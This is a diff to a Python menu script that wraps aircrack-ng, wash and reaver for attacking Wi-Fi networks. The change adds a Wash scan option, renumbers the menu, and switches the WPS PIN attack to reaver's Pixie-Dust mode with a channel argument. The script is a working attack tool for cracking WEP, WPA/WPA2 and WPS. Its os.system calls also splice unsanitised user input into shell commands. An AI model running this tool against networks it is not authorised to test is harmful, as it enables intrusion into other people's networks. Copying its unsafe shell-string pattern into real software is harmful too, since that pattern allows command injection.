@@ -16,11 +16,12 @@ def main():
   print('   /_/ |_/\___/\__/____\____/_/   \ \__,_/\___/_/|_|')
   print('                 /_____/           \____/')
   print('==========================================================')
-  print('*[1] Scan Local Networks                                 *')
-  print('*[2] Crack WEP Network                                   *')
-  print('*[3] Crack WPA/WPA2 Network Using PMKID Method           *')
-  print('*[4] Crack WPA/WPA2 Network Using PIN Method             *')
-  print('*[5] Exit                                                *')
+  print('*[1] Scan Local Networks (Airodump-ng)                   *')
+  print('*[2] Scan Local Networks (Wash)                          *')
+  print('*[3] Crack WEP Network                                   *')
+  print('*[4] Crack WPA/WPA2 Network Using PMKID Method           *')
+  print('*[5] Crack WPA/WPA2 Network Using PIN (Pixie-Dust) Method*')
+  print('*[6] Exit                                                *')
   print('==========================================================')
   in_put = input(': ')
   if in_put == '1':
@@ -30,6 +31,12 @@ def main():
     wait()
     main()
   if in_put == '2':
+    print(Fore.CYAN + '[*]Make sure to note down network bssid and channel number...')
+    print('[*]Enter ^C or ^Z to exit scanner mode...' + Style.RESET_ALL)
+    os.system('wash -i ' + interface + 'mon')
+    wait()
+    main()
+  if in_put == '3':
     bssid = input(Fore.CYAN + '[*]Enter WEP Network BSSID: ' + Style.RESET_ALL)
     channel = input(Fore.CYAN + '[*]Enter WEP Network Channel: ' + Style.RESET_ALL)
     print(Fore.CYAN + '[*]Gathering Packets From Network: ' + bssid + '... (Wait Until You Have About 1000 IVs)' + Style.RESET_ALL)
@@ -37,7 +44,7 @@ def main():
     os.system('aircrack-ng wep.pcap')
     wait()
     main()
-  if in_put == '3':
+  if in_put == '4':
     adapt = input(Fore.CYAN + '[*]Do you have a wifi adapter with packet injection?[y/N]: ' + Style.RESET_ALL)
     if adapt == 'y' or adapt == 'Y':
       bssid = input(Fore.CYAN + '[*]Enter WPA/WPA2 Network BSSID: ' + Style.RESET_ALL)
@@ -56,14 +63,14 @@ def main():
       print(Fore.RED + "[*]You can't attack a WPA/WPA2 encrypted network without packet injection..." + Style.RESET_ALL)
       wait()
       main()
-  if in_put == '4':
-    bssid = input(Fore.CYAN + '[*]Enter WEP Network BSSID: ' + Style.RESET_ALL)
-    channel = input(Fore.CYAN + '[*]Enter WEP Network Channel: ' + Style.RESET_ALL)
+  if in_put == '5':
+    bssid = input(Fore.CYAN + '[*]Enter Network BSSID: ' + Style.RESET_ALL)
+    channel = input(Fore.CYAN + '[*]Enter Network Channel: ' + Style.RESET_ALL)
     print(Fore.CYAN + '[*]Running Reaver to attack WPS PIN exploit...' + Style.RESET_ALL)
-    os.system('reaver -i ' + interface + 'mon -b ' + bssid + ' -vv')
+    os.system('reaver -i ' + interface + 'mon -b ' + bssid + ' -c ' + channel + '  -vv -Z')
     wait()
     main()
-  if in_put == '5':
+  if in_put == '6':
     wait()
     exit()
 
